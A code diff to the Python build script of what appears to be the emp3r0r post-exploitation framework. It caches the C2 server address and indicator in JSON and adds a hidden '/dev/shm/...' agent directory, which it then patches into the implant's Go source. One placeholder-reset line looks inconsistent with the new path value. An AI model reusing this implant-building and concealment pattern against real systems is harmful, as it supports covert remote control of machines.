@@ -7,6 +7,7 @@ this script replaces build.sh, coz bash/sed/awk is driving me insane
 '''
 
 import glob
+import json
 import os
 import shutil
 import sys
@@ -40,10 +41,23 @@ class GoBuild:
         self.INDICATOR = cc_indicator
         self.UUID = str(uuid.uuid1())
 
+        # agent root directory
+
+        if "agent_root" in CACHED_CONF:
+            self.AgentRoot = CACHED_CONF['agent_root']
+        else:
+            self.AgentRoot = f"/dev/shm/.../{uuid.uuid4()}"
+            CACHED_CONF['agent_root'] = self.AgentRoot
+
     def build(self):
         '''
         cd to cmd and run go build
         '''
+        # write cache
+        json_file = open(BUILD_JSON, "w+")
+        json.dump(CACHED_CONF, json_file)
+        json_file.close()
+
         self.gen_certs()
         # CA
         f = open("./tls/rootCA.crt")
@@ -85,15 +99,9 @@ class GoBuild:
         generate server cert/key, and CA if necessary
         '''
 
-        if os.path.exists("./build/ccip.txt"):
-            f = open("./build/ccip.txt")
-
-            if self.CCIP == f.read() and os.path.exists("./build/emp3r0r-key.pem"):
-                f.close()
-
+        if "ccip" in CACHED_CONF:
+            if self.CCIP == CACHED_CONF['ccip'] and os.path.exists("./build/emp3r0r-key.pem"):
                 return
-
-            f.close()
 
         log_warn("[!] Generating new certs...")
         try:
@@ -119,7 +127,7 @@ class GoBuild:
         '''
 
         sed("./internal/agent/def.go",
-            f"/dev/shm/.../{uuid.uuid4()}", "[agent_root]")
+            f"/dev/shm/.../{self.AgentRoot}", "[agent_root]")
         sed("./internal/tun/tls.go", self.CA, "[emp3r0r_ca]")
         sed("./internal/agent/def.go", self.INDICATOR, "[cc_indicator]")
         # in case we use the same IP for indicator and CC
@@ -138,6 +146,7 @@ class GoBuild:
 
         sed("./internal/tun/tls.go", "[emp3r0r_ca]", self.CA)
         sed("./internal/agent/def.go", "[cc_ipaddr]", self.CCIP)
+        sed("./internal/agent/def.go", "[agent_root]", self.AgentRoot)
         sed("./internal/agent/def.go", "[cc_indicator]", self.INDICATOR)
         sed("./internal/agent/def.go", "[agent_uuid]", self.UUID)
 
@@ -198,22 +207,19 @@ def main(target):
 
     # cc IP
 
-    if os.path.exists("./build/ccip.txt"):
-        f = open("./build/ccip.txt")
-        ccip = f.read().strip()
-        f.close()
+    if "ccip" in CACHED_CONF:
+        ccip = CACHED_CONF['ccip']
         use_cached = yes_no(f"Use cached CC address ({ccip})?")
 
     if not use_cached:
         if yes_no("Clean everything and start over?"):
             clean()
         ccip = input("CC server address (domain name or ip address): ").strip()
-        f = open("./build/ccip.txt", "w+")
-        f.write(ccip)
-        f.close()
+        CACHED_CONF['ccip'] = ccip
 
     if target == "cc":
         cc_other = ""
+
         if not os.path.exists("./build/emp3r0r-key.pem"):
             cc_other = input(
                 "Additional CC server addresses (separate with space): ").strip()
@@ -231,17 +237,13 @@ def main(target):
 
     use_cached = False
 
-    if os.path.exists("./build/indicator.txt"):
-        f = open("./build/indicator.txt")
-        indicator = f.read().strip()
-        f.close()
+    if "cc_indicator" in CACHED_CONF:
+        indicator = CACHED_CONF['cc_indicator']
         use_cached = yes_no(f"Use cached CC indicator ({indicator})?")
 
     if not use_cached:
         indicator = input("CC status indicator: ").strip()
-        f = open("./build/indicator.txt", "w+")
-        f.write(indicator)
-        f.close()
+        CACHED_CONF['cc_indicator'] = indicator
 
     gobuild = GoBuild(target="agent", cc_indicator=indicator, cc_ip=ccip)
     gobuild.build()
@@ -259,6 +261,17 @@ def log_warn(msg):
     print in red
     '''
     print("\u001b[33m"+msg+"\u001b[0m")
+
+
+# JSON config file, cache some user data
+BUILD_JSON = "./build/build.json"
+CACHED_CONF = {}
+try:
+    jsonf = open(BUILD_JSON)
+    CACHED_CONF = json.load(jsonf)
+    jsonf.close()
+except BaseException:
+    log_warn(traceback.format_exc())
 
 
 if len(sys.argv) != 2:
